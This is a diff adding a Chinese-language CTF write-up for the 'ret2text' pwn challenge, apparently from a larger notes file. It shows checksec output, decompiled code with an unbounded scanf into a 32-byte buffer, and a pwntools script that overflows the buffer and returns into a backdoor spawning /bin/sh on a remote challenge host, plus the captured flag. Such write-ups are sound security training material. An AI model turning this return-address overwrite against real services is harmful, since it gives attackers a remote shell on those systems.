@@ -2410,6 +2410,82 @@ io.interactive()
 
 ------
 
+### ret2text
+
+先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
+└─$ file ./pwn           
+./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=91958f3de15439a5e19498ff6c24650656401015, not stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2text]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2text/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init(argc, argv, envp);
+  puts("Welcome!May I have your name?");
+  __isoc99_scanf("%s", v4);
+  puts("Ok.See you!");
+  return 0;
+}
+```
+
+存在栈溢出漏洞，双击`v4`变量查看栈结构：
+
+```assembly
+-0000000000000020 ; D/A/*   : change type (data/ascii/array)
+-0000000000000020 ; N       : rename
+-0000000000000020 ; U       : undefine
+-0000000000000020 ; Use data definition commands to create local variables and function arguments.
+-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
+-0000000000000020 ;
+-0000000000000020
+-0000000000000020 var_20          db 32 dup(?)
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+注意到`Functions window`中有个`backdooOo0r()`函数，其返回值直接执行了`/bin/sh`。
+
+```c
+int backdooOo0r()
+{
+  return execve("/bin/sh", 0LL, 0LL);
+}
+```
+
+编写`Python`代码求解得到`flag{8c05c222-e73e-4f15-b977-a26310b808e5}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 28674)
+elf = ELF('./pwn')
+backdoor = elf.symbols['backdooOo0r']
+payload = b'a'*(0x20+0x8) + p64(backdoor)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
